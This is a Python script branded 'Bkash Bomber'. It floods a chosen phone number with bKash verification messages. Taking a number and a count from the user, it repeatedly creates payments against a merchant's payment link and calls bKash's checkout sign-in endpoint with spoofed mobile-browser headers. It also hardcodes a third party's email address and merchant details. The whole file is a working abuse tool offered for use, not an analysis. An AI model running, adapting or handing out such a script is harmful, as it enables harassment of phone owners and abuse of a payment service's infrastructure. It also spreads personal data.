import requests
import os
import time
from requests.exceptions import ConnectionError

def print_with_magic(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")
    time.sleep(0.1)  

def check_internet():
    try:
        requests.get('http://www.google.com', timeout=1)
        return True
    except ConnectionError:
        return False


if not check_internet():
    print("\033[91m❌ No internet connection. Exiting...\033[0m")
    exit()

def print_with_magic(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")
    time.sleep(0.1)  


os.system('clear')  


ascii_art = [
    "┌──────────────────────────────┐",
    "│██████   ██████  ███    ███ ██████  │",
    "│██   ██ ██    ██ ████  ████ ██   ██ │",
    "│██████  ██    ██ ██ ████ ██ ██████  │",
    "│██   ██ ██    ██ ██  ██  ██ ██   ██ │",
    "│██████   ██████  ██      ██ ██████  │",
    "└──────────────────────────────┘",
    "│Author: @Team_Cicada3301         │",
    "│Github: https://github.com/Mr-alvi0│",
    "│Tool: Bkash Bomber               │",
    "│Coder: CICADA                    │",
    "└──────────────────────────────┘"
]

color_codes = [91, 93, 92, 94, 95]  


terminal_width = os.get_terminal_size().columns

for line in ascii_art:
    padding = (terminal_width - len(line)) // 2
    print_with_magic(" " * padding + line, color_codes[ascii_art.index(line) % len(color_codes)])


number = input("[\033[1;32m*\033[0m] \033[1;31m Enter Number: \033[0m")
repeated_by = int(input("[\033[1;32m*\033[0m] \033[1;31m Enter Amount: \033[0m"))

headers1 = {
    "Host": "cpp.bka.sh",
    "content-length": "502",
    "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36",
    "visitor-id": "3dad1ef5fdd9f0eca40834f5083c465a1707932257317",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "x-user-ip-address": "37.111.205.224",
    "sec-ch-ua-platform": "Android",
    "origin": "https://shop.bkash.com",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://shop.bkash.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
}

data1 = {
    "intent": "sale",
    "basePath": "nazrul-mobile-shop01614849817",
    "urlFragment": "pay/bdt30/DkW1Sy",
    "trxType": "AMOUNT",
    "amount": "30",
    "price": "30",
    "packageName": "",
    "quantity": 0,
    "customerName": "",
    "customerPhoneNumber":"",
    "customerEmail": "",
    "customerReference": "Arman",
    "customerAddress": "",
    "customerMembershipId": "",
    "customerBillMonth": "",
    "references": [
        {
            "fieldName": "Email",
            "fieldType": "EMAIL",
            "required": False,
            "value": "armanhasansanto7@gmail.com",
        }
    ],
    "sourceType": "payment-link",
    "useWalletAsContact": True,
}

headers2 = {
    "Host": "checkoutbg.pay.bka.sh",
    "content-length": "86",
    "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
    "accept": "*/*",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36",
    "sec-ch-ua-platform": "Android",
    "origin": "https://client.pay.bka.sh",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://client.pay.bka.sh/checkout/2",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
}

data2 = {
    "wallet": number,
    "paymentID": "AVGUFK61707932283186", 
    "apiVersion": "v1.2.0-beta",
}

for _ in range(repeated_by):
    try:
        response1 = requests.post("https://cpp.bka.sh/customer-portal-middleware/create-payment", headers=headers1, json=data1)
        paymentID = response1.json().get("paymentID")
        data2["paymentID"] = paymentID
        response2 = requests.post("https://checkoutbg.pay.bka.sh/signInCheckout", headers=headers2, json=data2)
        if response2.status_code == 200:
            response_json = response2.json()
            if response_json.get("statusCode") == "0000":
                print("\033[92m✅Bombing Started number:", number)
            elif response_json.get("statusCode") == "2003":
                print("\033[91m❌This Was Not Any Bkash Number:", number)
            elif response_json.get("statusCode") == "2009":
                print("\033[91m❌Input Right Phone Number:", number)
        else:
            print("\033[91m❌Check your Data Or WIFI")
    except ConnectionError:
        print("\033[91m❌Check your Data Or WIFI")
